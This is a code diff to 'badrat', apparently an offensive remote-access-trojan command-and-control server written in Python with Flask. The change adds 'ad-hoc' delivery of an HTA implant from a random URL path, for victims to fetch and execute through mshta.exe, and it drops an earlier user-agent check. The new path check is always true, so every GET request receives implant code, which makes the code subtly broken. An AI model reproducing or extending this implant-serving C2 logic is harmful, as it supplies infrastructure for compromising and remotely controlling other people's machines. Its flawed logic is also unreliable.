@@ -144,7 +144,7 @@ def pretty_print_banner():
     $$ |  $$ | $$$$$$$ |$$ /  $$ |$$ |  \__| $$$$$$$ |  $$ |    \$$$$$$\        (    / _/    /' o O| ,_( ))___     (`
     $$ |  $$ |$$  __$$ |$$ |  $$ |$$ |      $$  __$$ |  $$ |$$\  \____$$\        ` -|   )_  /o_O_'_(  \\'    _ `\    )
     $$$$$$$  |\$$$$$$$ |\$$$$$$$ |$$ |      \$$$$$$$ |  \$$$$  |$$$$$$$  |          `"\"\"\"`            =`---<___/---'
-    \_______/  \_______| \_______|\__|       \_______|   \____/ \_______/  v1.2.2 Tabulatory Completion    "`
+    \_______/  \_______| \_______|\__|       \_______|   \____/ \_______/  v1.3.2 Ad-Hoc HTAs              "`
     """
     pretty_print(banner)
 
@@ -224,12 +224,19 @@ def default_page():
     return(htmlify(message))
 
 # Allow rats to call home and request more ratcode of their own type
-def send_ratcode(ratID):
-    pretty_print("\n[*] sending " + colors(types[ratID]) + " ratcode to " + colors(ratID))
-    with open(os.getcwd() + "/rats/badrat." + types[ratID], 'r') as fd:
+def send_ratcode(ratID=None):
+    if(not ratID): # Ad hoc ratcode send
+        pretty_print("[*] sending ad-hoc " + colors("hta") + " ratcode")
+        fd = open(os.getcwd() + "/rats/badrat.hta", 'r')
+        ratcode = fd.read()
+    else:
+        pretty_print("\n[*] sending " + colors(types[ratID]) + " ratcode to " + colors(ratID))
+        fd = open(os.getcwd() + "/rats/badrat." + types[ratID], 'r')
         ratcode = fd.read()
         ratcode = base64.b64encode(ratcode.encode('utf-8')).decode('utf-8')
-        return(ratcode)
+
+    fd.close()
+    return(ratcode)
 
 def encode_file(filepath):
     with open(Path(filepath).resolve() , "rb") as fd:
@@ -352,10 +359,10 @@ def serve_server(port=8080):
     @app.route('/<path:path>', methods=['GET'])
     def badrat_get(path):
         user_agent = request.headers['User-Agent']
-        # Path must be /documents/b.hta AND user agent belongs to mshta.exe
+        # # Path must be /documents/b.hta AND user agent belongs to mshta.exe
         # Easy way to serve HTA's
-        if("/documents/b.hta" in path and "MSIE" in user_agent and ".NET" in user_agent and "Windows NT" in user_agent):
-            return(send_ratcode(ratID))
+        if("/" + rand_path + "/b.hta"):
+            return(send_ratcode())
         elif(verbose):
             pretty_print("[v] GET request from non-rat client requested path /" + path)
         return(default_page())
@@ -407,6 +414,9 @@ def serve_server(port=8080):
     if(verbose):
         pretty_print("[v] Starting badrat in verbose mode. Prepare to have your screen flooded.")
 
+    rand_path = ''.join(random.choice(alpha) for choice in range(10)) 
+    pretty_print("[*] Ad-Hoc " + colors("hta") + "'s servable from path: " + colors("/" + rand_path + "/b.hta"))
+
     # Run the listener. Choose between HTTP and HTTPS based on if --ssl was specfied
     if(ssl):
         pretty_print("[*] Starting " + colors("HTTPS") + " listener on port " + str(port))
@@ -416,7 +426,6 @@ def serve_server(port=8080):
         pretty_print("[*] Starting " + colors("HTTP") + " listener on port " + str(port) + "\n\n")
         app.run(host="0.0.0.0", port=port)
 
-    pretty_print("HTA's servable from path: " + colors("/documents/b.hta"))
 
 def get_rats(current=""):
     pretty_print("\n    implant id \ttype\tcheck-in\tusername")
